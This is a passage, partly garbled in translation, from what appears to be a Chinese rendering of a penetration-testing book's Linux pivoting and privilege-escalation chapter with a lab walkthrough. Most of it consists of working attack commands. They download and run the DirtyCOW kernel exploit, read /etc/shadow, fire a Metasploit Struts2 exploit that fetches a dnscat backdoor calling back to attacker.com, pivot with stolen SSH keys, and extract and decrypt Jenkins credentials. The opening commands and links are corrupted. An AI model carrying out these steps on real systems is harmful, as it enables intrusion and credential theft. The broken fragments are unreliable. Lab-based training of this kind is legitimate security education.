  \ 副本 (7).jpg)[url]http//bit/Iy/CEppfb[]()![(http/images/bits)“”\"\n```bash\\portfwd\
  \ add -l 389-p-8-r[targetj]\n\n一旦我们在受侵害的主机上获得凭据并可以 SSH 回来，我们就可以隧道传输我们的流量并在盒子之间进行\
  \ pivot（中转）。在 SSH 中，我们有一些很棒的功能允许我们执行此 pivoting:\n- **Setting up Dynamic Sock Proxy**(设置动态\
  \ SOCK 代理) to use proxychainsfor a single port:\n\n```bash\\sshr <unser@Trgetp>-L\
  \  \n```\n- **VPN over SSH**通过 SSH 的 VPN。这是一个很棒的功能，使得隧道第三层网络流量的可能。*   `http://bit.ly/2Eppfb`[url]()\
  \  \n\n## 提权 (Privilege Escalation)\n\nLinux 特权升级就像 Windows 大部分情况一样**。我们寻找写入漏洞服务、sticky\
  \ bit（粘滞位）misconfigurations, passwords in flatfiles（平铺文件中的密码），**world-writable files**(世界可写文件),\
  \ Cronjobs(**cronjob**)以及当然补丁问题。\n\nIn terms of effectively and efficiently parsing\
  \ a Linux box for privilege escalation issues 我们可以使用一些工具为我们完成所有工作 (做所有的脏活)。在进行任何类型的特权升级\
  \ exploits 之前，我喜欢先用 [LinEnum](https://github.com/rebootuser/LinEnum) **好好读取 Linux\
  \ 主机并识别系统的所有信息**。包括用户、服务**Cronjobs**,软件版本弱凭证 misconfigured filepermissions 错误配置的文件权限以及\
  \ even docker information.\n![images0139jpeg: images/042.jpeg]\n\n\n\n\n\n这是一份关于底层系统相关知识的详尽报告，对于未来的行动（campaigns）而言非常有用。\n\
  \n在获取有关该系统的相关信息后，我们试图寻找是否可利用其中的任何漏洞。如果我们无法找到 sticky bit 漏洞或在服务/cronjobs 中滥用错误配置，那么我们将直接针对系统进行利用。我通常将这一类操作放在最后进行，因为始终存在导致系统中断/变砖（halt/brick\
  \ the box）的潜在风险。\n\n我们可以运行名为 `linux-exploit-suggester` (`https://github.com/mzet-/linux-exploit-suggester`)\
  \ 的工具来分析主机系统并识别缺失补丁和漏洞。一旦识别出某种漏洞，该工具还会为您提供 POC (概念验证) 利用程序的链接。\n\n![](img/00131.jpeg)\n\
  \n现在，我们需要寻找什么来进行利用？这取决于经验和实践能力。在我的实验环境中，我配置了大量不同版本的 Linux，以验证这些利用程序不会导致底层系统崩溃。在这个场景下，我最喜欢的漏洞之一就是\
  \ `DirtyCOW`（肮脏的奶牛）。\n\n`DirtyCOW` 是指“在 Linux 内核内存子系统处理写访问时打破只读私有映射 COW (Copy-On-Write)\
  \ 情况的方法中发现了竞态条件。一个无特权的本地用户可以利用此缺陷获取对原本为只读的内存映射的写入权限，从而提升其在系统上的特权。” (`https://dirtycow.ninja/`)\n\
  \n简而言之，这种漏洞允许攻击者通过内核漏洞从非特权用户提升至 root。这是我们梦寐以求的最佳类型的提权方式！不过有一个问题，即该漏洞已知会导致内核恐慌（kernel\
  \ panic），因此我们必须确保在正确的 Linux 内核上使用相应的版本。\n\n### 在 Ubuntu 上测试 DirtyCOW\n\nUbuntu 14.04.1\
  \ LTS (3.13.0-32-generic x86_64)：\n\n*   下载 `DirtyCOW` 负载\n    *   ```\n       \
  \ wget http://bit.ly/2vdh2Ub -O dirtycow-mem.c\n        ```\n*   编译 `DirtyCOW` 负载\n\
  \    *   ```\n        gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread\n\
  \        ```\n*   运行 `DirtyCOW` 以获取系统权限\n    *   ```\n        ./dirtycow-mem\n \
  \       ```\n*   关闭周期性写入回写以使利用程序稳定\n    *   ```\n        echo 0 > /proc/sys/vm/dirty_writeback_centisecs\n\
  \        ```\n*   尝试读取 shadow 文件（影子密码文件）\n    *   ```\n        cat /etc/shadow\n\
  \        ```\n\n## Linux 横向移动实验室 (Lateral Movement Lab)\n\n纵向/水平移动的问题在于，如果没有搭建好可以进行迂回攻击（pivot）的环境，就很难进行练习。因此，我们为您提供\
  \ `CSK Secure Network Lab`。在这个实验中，您将在不同的机器之间进行迂回操作，使用最新的利用工具和提权攻击，并在 Linux 环境中就地执行攻击活动（live\
  \ off the land）。\n\n### 搭建虚拟环境\n\n这个虚拟环境实验的设置略显复杂。这是因为网络需要运行三台配置为静态 IP 的虚拟机，而且您需要预先完成某些设置工作。所有这些内容都在\
  \ `VMWare Workstation`和`VirtualBox`中进行过测试并兼容于`VMware Fusion` (注意：如果在 VirtualBox\
  \ 上可能需要自行调整)。\n\n下载这三台虚拟机：\n\n*   ```\n    http://thehackerplaybook.com/get.php?type=csk-lab\n\
  \    ```\n*   虽然您通常不需要这些机器的 root 账户，但以防万一，这里提供用户名和密码：`hacker/changeme`。\n\n所有三台虚拟机的配置均使用\
  \ NAT 网络接口。为了使该实验正常工作，您必须在 VMWare 中配置虚拟机的 NAT 设置以使用 `172.16.250.0/24` 网络。在 Windows\
  \ 的 **VMware Workstation**中进行此操作：\n\n*   在主菜单栏中，选择 Edit (编辑) -> virtual network\
  \ editor (虚拟化网络编辑器) -> change settings (更改设置)。\n    *   ![编辑网卡](https://example.com/image-placeholder-edit.png)\
  \ *(此处为示意，实际操作请参照原文截图)*\n*   选中类型为 NAT 的接口（您的可能是 VMnet8）。\n*   将子网 IP 改为 `172.16.250.0`\
  \ 并点击应用。\n\n在 OS X (macOS) 上则更为复杂，您需要：\n\n*   复制原始的 dhcpd.conf 文件作为备份。\n    *  \
  \ ```\n        sudo cp /Library/Preferences/VMware\\ Fusion/vmnet8/dhcpd.conf /Library/Preferences/VMware\\\
  \ Fusion/vmnet8/dhcpd.conf.bakup\n        ```\n*   编辑 dhcpd.conf 文件，将其网络配置从 `192.168.x.x`\
  \ 改为使用 `172.16.250.x`。\n    *   ```\n        sudo vi /Library/Preferences/VMware\\\
  \ Fusion/vmnet8/dhcpd.conf\n        ```\n*   编辑 nat.conf 以使用正确的网关地址。\n    *   ```\n\
  \        sudo vi /Library/Preferences/VMware\\ Fusion/vmnet8/nat.conf\n        ```\n\
  \n            *   # NAT 网关地址设置\n            *   ```\n                ip = 172.16.250.2\n\
  \                netmask = 255.255.255.0\n                ```\n*   重启服务：\n    *\
  \   ```\n        sudo /Applications/VMware\\ Fusion.app/Contents/Library/services/services.sh\
  \ --stop\n        sudo /Applications/VMware\\ Fusion.app/Contents/Library/services/services.sh\
  \ --start\n        ```\n\n现在，您应该能够以 NAT 模式启动您的 THP Kali VM，并在 `172.16.250.0/24`范围内获取\
  \ DHCP IP。如果成功获得该 IP，请同时启动所有三个实验室服务器并开始进行渗透攻击。\n\n### 攻击 CSK 安全网络 (CSK Secure Network)\n\
  \n您终于通过迂回攻击离开了 Windows 环境，进入了受保护的生产网络。根据之前的 Reconnaissance（侦察）和研究报告显示，所有的秘密都存储在此处。这是他们的防护最严密的网络之一，我们了解到他们对该安全架构进行了分割部署。根据其文档，似乎存在多个待攻陷的\
  \ VLAN (虚拟局域网)，看来您不得不迂回操作以进入保险库数据库 (vault database)。这正是您所接受的所有训练的成果……\n\n在从外部向受保护的网络区域进行迂回时，你会发现该环境配置的网络范围位于\
  \ `172.16.250.0/24` 网段内。由于您对这一网络了解不多，您首先需要运行一些非常轻量级的 nmap 扫描。您需要识别哪些系统可以从该网络外部访问，以便确定如何开始您的攻击。\n\
  \n扫描受保护的网络：\n\n*   ```\n    nmap 172.16.50.0/24\n    ``` *(注：原文此处 IP 可能应为实验环境定义的网段，翻译时保留原文格式)*\n\
  \n您注意到有三台服务器正在运行，但其中只有一台开启了 Web 端口。看起来另外两台服务器是从该安全网络外部隔离的，这意味着我们必须先攻陷 `172.16.250.10`\
  \ 号机器，然后才能迂回进入其他两台服务器。访问第一台机器 (`172.16.250.10`)后，您发现 Apache Tomcat 正在监听 8080 端口，而\
  \ openCMS 在 80 端口运行。使用 Web Fuzzer (Web 模糊测试器)进行扫描时，您注意到 openCMS 页面同时也在运行 `Apache\
  \ Struts2` (`/struts2-showcase`)。刹那间，Equifax（ Equifax 数据泄露事件）的闪回如同一块砖头重重地砸向您脑海。您心想这看起来好得不真实，但无论如何必须进行核实。您在\
  \ `msfconsole` 上快速搜索并测试了漏洞利用程序 **struts2_content_type_ognl**。\n\n![](img/00132.jpeg)\n\
  \n我们知道 CSK (公司名称缩写)严密监控其受保护的网络流量，且其内部服务器可能不允许直接访问企业网络。为了绕过这一限制，我们需要使用带有 `dnscat2`\
  \ 的 DNS C2（命令与控制）负载通过 UDP 而不是 TCP 进行通信。当然在现实世界中，我们可能会使用权威域名服务器 (Authoritative DNS\
  \ server)，但在本实验环境下，我们将自身充当 DNS 服务器。\n\n#### [THP Kali Machine]\n\nTHP Kali 自定义虚拟机应该具备执行这些攻击所需的所有工具。\n\
  \n*   我们需要将负载托管在某台 Web 服务器上以便我们可以让 Metasploit 的载荷获取 dnscat2 恶意软件。在 dnscat2 客户端文件夹中包含的是\
  \ dnscat 二进制文件。\n    *   ```\n        cd /opt/dnscat2/client/\n        python -m\
  \ SimpleHTTPServer 80\n        ```\n*   启动一个 dnscat 服务器\n    *   ```\n        cd\
  \ /opt/dnscat2/server/\n        ruby ./dnscat2.rb\n        ```\n*   记录您的 DNScat\
  \ 密钥\n\n![](img/00133.jpeg)\n\n*   打开新终端并加载 Metasploit\n\n    *   ```\n        msfconsole\n\
  \        search struts2\n        use exploit/multi/http/struts2_content_type_ognl\n\
  \        set RHOST 172.16.250.10\n        set RPORT 80\n        set TARGETURI struts2-showcase/showcase.action\n\
  \        set PAYLOAD cmd/unix/generic\n        ```\n\n\n\n\n\n### 命令执行示例\n\n*  \
  \ `set CMD wget http://<your_ip>/dnscat -O /tmp/dnscat && chmod +x /tmp/dnscat &&\
  \ /tmp/dnscat --dns server=attacker.com,port=53 —secret=<Your Secret Key>`\n*  \
  \ run\n\n一旦载荷执行，您将在 Metasploit 中不会收到任何确认信息，因为我们使用了 dnscat 载荷。您需要使用 DNS 流量检查您的 dnscat\
  \ 服务器以进行连接：`![](img/00134.jpeg)`\n\n回到您的 DNSEAT2 服务器，检查新执行的载荷并创建 shell 终端：\n*  \
  \ 与您的第一个载荷交互\n    *   `window -i 1`\n*   生成一个 Shell 进程\n    *   `shell`\n*   通过键盘按钮返回主菜单\n\
  \    *   `ctrl + z`\n*   与您新的 shell 交互\n    *   `window -i 2`\n*   输入 Shell 命令\n\
  \    *   `ls`\n\n您已入侵 OpenCMS/Apache Struts 服务器！现在怎么办？您花些时间审查服务器并寻找诱人的秘密。您记得该服务器正在运行\
  \ OpenCMS Web 应用程序，并识别出该应用程序配置在``/opt/tomcat/webapps/kittens`` 下。在审查 OpenCMS 属性配置文件时，我们发现数据库、用户名、密码和\
  \ IP 地址 `172.16.250.10`。\n\n### 检索数据库信息：\n\n*   `cat /opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties`\n\
  \n我们连接到数据库，但并未看到多少。问题是我们目前是一个有限的 tomcat 用户，这真的阻碍了我们的攻击。因此，我们需要找到一种方法来提升权限。在服务器上运行后续侦察\
  \ (`uname -a && lsb_release -a`)，您识别出这是一个相当旧的 Ubuntu 版本。幸运的是，该服务器存在 DirtyCOW 特权提升漏洞。让我们创建一个\
  \ DirtyCOW 二进制文件并获取 root！\n\n### 通过 dnscat 进行特权提升：\n\n下载并编译 DirtyCOW：\n1. `cd /tmp`\n\
  2. `wget http://bit.ly/2vdh2Ub -O dirtycow-mem.c`\n3. `gcc -Wall -o dirtycow-mem\
  \ dirtycow-mem.c -ldl -lpthread`\n4. ``./dirtycow-mem``\n\n尝试让 DirtyCOW 漏洞保持稳定，并允许在内核恐慌时进行重启：\n\
  1. `echo 0 > /proc/sys/vm/dirty_writeback_centisecs`\n2. `echo 1 > /proc/sys/kernel/panic\
  \ && echo 1 > /proc/sys/kernel/panic_on_oops&& echo 1 > /proc/sys/kernel/panic_on_unrecovered_nmi\
  \ && echo 1 > /proc/sys/kernel/panic_on_io_nmi && echo 1 > /proc/sys/kernel/panic_on_warn`\n\
  3. `whoami`\n\n注意：DirtyCOW 并不是一种很稳定的特权提升方法。如果您遇到问题，请查看我的 GitHub 页面，此处提供了一个创建 setuid\
  \ 二进制文件的过程：https://raw.githubusercontent.com/cheetz/dirtycow/master/THP-Lab\n\n\
  如果您仍然遇到问题，另一种选项是通过 SSH 登录到初始服务器并以 root 身份执行 dnscat 载荷。要登录，使用凭据 `hacker/changeme`\
  \ 和命令 `sudo su -` 获取 root。\n\n现在，您已在系统中成为 root，原因是主机系统未打补丁。当您开始再次从箱子里搜刮秘密时，您遇到 root\
  \ 的 bash 历史文件。在这个文件中，您发现了一个 SSH 命令和私有 SSH 密钥引用。我们可以利用这个 SSH 密钥登录到我们的第二台机器 `172.16.250.30`：\n\
  *   `cat ~/.bash_history`\n*   `head ~/.ssh/id_rsa`\n*   `ssh -i ~/.ssh/id_rsa root@172.16.250.30`\n\
  \n您在第二台机器上花费了一些时间，并试图了解它的用途。四处搜索时，您注意到 `/home` 目录中有一个 Jenkins 用户，这使您能够识别在 8080 端口上运行的\
  \ Jenkins 服务。我们如何利用浏览器查看 Jenkins 服务器上有什么？这就是 dnscat 的端口转发功能发挥作用的时候。我们需要从当前的 shell\
  \ 退出，转到命令行终端。在那里，我们需要设置监听器以将我们的流量从攻击机通过 dnscat 转发到 Jenkins 盒子 (`172.16.250.30`)\
  \ 的 8080 端口。\n\n### 执行 dnscat 端口转发：\n\n*   从当前的 shell 退出：`Ctrl + z`\n*   回到第一个命令代理并设置监听器/端口转发：\n\
  \    *   `window -i 1`\n    *   ``listen 127.0.0.1:8080 172.16.250.30:8080``\n*\
  \   在您的 THP Kali VM 上，进入浏览器并使用我们的端口转发（通过 DNS 会非常慢）：`http://127.0.0.1:8080/jenkins`\n\
  \n在 Jenkins 应用程序内的凭据管理器中，我们可以看到 db_backup 用户密码被存储，但不可见。我们需要找出一种从 Jenkins 获取此凭据的方法，以便我们可以继续进行横向移动。\n\
  \nn00py 对 Jenkins 内部存储的凭据及其提取方法做了一些出色的研究 (`http://bit.ly/2GUIN9s`)。我们可以利用现有的 shell\
  \ 并利用此攻击来获取 `credentials.xml`， ``master.key`` 和 ``hudson.util.Secret`` 文件。\n\n回到\
  \ dnscat 的主菜单并与您的原始 shell 交互：\n*   `Ctrl + z`\n*   `window -i 2`\n\n进入 Jenkins 的主目录并获取这三个文件：`credentials.xml`，\
  \ ``master.key`` 和 ``hudson.util.Secret``。\n1. `cd /home/Jenkins`\n\n我们可以尝试离线下载这些文件，或者我们可以对这些文件进行\
  \ base64 编码并通过当前 shell 复制它们。\n*   `base64 credentials.xml`\n*   `base64 secrets/hudson.util.Secret`\n\
  *   `base64 secrets/master.key`\n\n我们可以将 base64 输出复制回我们的 Kali 盒子并对其进行解码，以解密 db_backup\
  \ 用户的密码：\n1. `cd /opt/jenkins-decrypt`\n2. ``echo \"<base64 hudson.util.Secret>\"\
  \ | base64 --decode > hudson.util.Secret``\n3. ``echo \"<base64 master.key >\" |\
  \ base64 --decode > master.key``\n4. ``echo \"<base64 credentials.xml >\" | base64\
  \ --decode > credentials.xml``\n\n使用 https://github.com/cheetz/jenkins-decrypt 解密密码：`python3\
  \ ./decrypt.py master.key hudson.util.Secret credentials.xml`\n\n我们成功解密了 db_backup\
  \ 用户的密码为 \")uDvra{4UL^;r?*h\"。如果我们回顾之前的笔记，我们在 OpenCMS 属性文件中看到数据库服务器位于 `172.16.250.50`。看起来由于某种原因，此\
